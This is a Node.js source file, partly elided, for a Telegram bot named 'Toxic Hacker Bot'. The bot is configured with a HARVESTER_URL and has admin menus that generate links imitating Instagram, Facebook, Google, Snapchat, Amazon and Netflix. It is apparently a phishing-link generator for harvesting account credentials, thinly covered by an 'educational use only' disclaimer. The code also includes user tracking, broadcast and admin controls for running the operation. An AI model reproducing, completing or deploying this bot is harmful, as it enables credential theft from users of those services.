// bot.js - Toxic Hacker Bot const { Telegraf, Markup } = require('telegraf'); const fs = require('fs');

// --- 🔧 CONFIGURATION --- const BOT_TOKEN = process.env.BOT_TOKEN; const HARVESTER_URL = process.env.HARVESTER_URL; const OWNER_ID = process.env.OWNER_ID; const CHANNEL_ID = process.env.CHANNEL_ID; const CHANNEL_LINK = process.env.CHANNEL_LINK;

if (!BOT_TOKEN || !HARVESTER_URL || !OWNER_ID || !CHANNEL_ID || !CHANNEL_LINK) { console.error("FATAL ERROR: Missing environment variables."); process.exit(1); }

const bot = new Telegraf(BOT_TOKEN); const DB_PATH = './db.json'; let adminState = {};

// --- 📁 DB Functions --- const readDb = () => { if (!fs.existsSync(DB_PATH)) { fs.writeFileSync(DB_PATH, JSON.stringify({ users: {}, admins: [parseInt(OWNER_ID)], blocked_users: [] }, null, 2)); } return JSON.parse(fs.readFileSync(DB_PATH)); }; const writeDb = (data) => fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2)); const isAdmin = (id) => readDb().admins.includes(parseInt(id));

// --- ✨ Start Message --- const startMessage = ` 🔥 TOXIC HACKER BOT

🔍 Credential Testing Interfaces: • Facebook • Instagram • Snapchat • Google • Amazon

🎯 For Educational Use Only! ❌ Illegal Use is Prohibited. ✅ Ethical Hacking | OSINT | Red Teaming

🔗 Join: @ToxicBack2025 `;

// --- 🧰 Keyboards --- const adminKeyboard = Markup.inlineKeyboard([ [Markup.button.callback('📊 User Status', 'admin_status'), Markup.button.callback('📢 Broadcast', 'admin_broadcast')], [Markup.button.callback('🔐 Generate Link', 'admin_generate_link')], [Markup.button.callback('➕ Add Admin', 'admin_add'), Markup.button.callback('➖ Remove Admin', 'admin_remove')], [Markup.button.callback('🚫 Block User', 'admin_block'), Markup.button.callback('✅ Unblock User', 'admin_unblock')], [Markup.button.callback('⬅️ Back to Panel', 'admin_panel_back')] ]);

const linkGenerationKeyboard = Markup.inlineKeyboard([ [Markup.button.callback('📸 Instagram', 'gen_link_Instagram'), Markup.button.callback('📘 Facebook', 'gen_link_Facebook')], [Markup.button.callback('🟢 Google', 'gen_link_Google'), Markup.button.callback('👻 Snapchat', 'gen_link_Snapchat')], [Markup.button.callback('📦 Amazon', 'gen_link_Amazon'), Markup.button.callback('🎬 Netflix', 'gen_link_Netflix')], [Markup.button.callback('⬅️ Back to Panel', 'admin_panel_back')] ]);

// --- 🟢 /start Command --- bot.start(async (ctx) => { const userId = ctx.from.id; const username = ctx.from.username ? @${ctx.from.username} : ctx.from.first_name; const db = readDb();
...
// --- 🔄 Callback Handler --- bot.on('callback_query', async (ctx) => { const userId = ctx.from.id; const data = ctx.callbackQuery.data; await ctx.answerCbQuery();
...
// --- 📝 Text Input Handler --- bot.on('text', async (ctx) => { const userId = ctx.from.id; const text = ctx.message.text;
...
// --- 🚀 Launch Bot --- bot.launch(); console.log('🔥 Toxic Hacker Bot is online.');
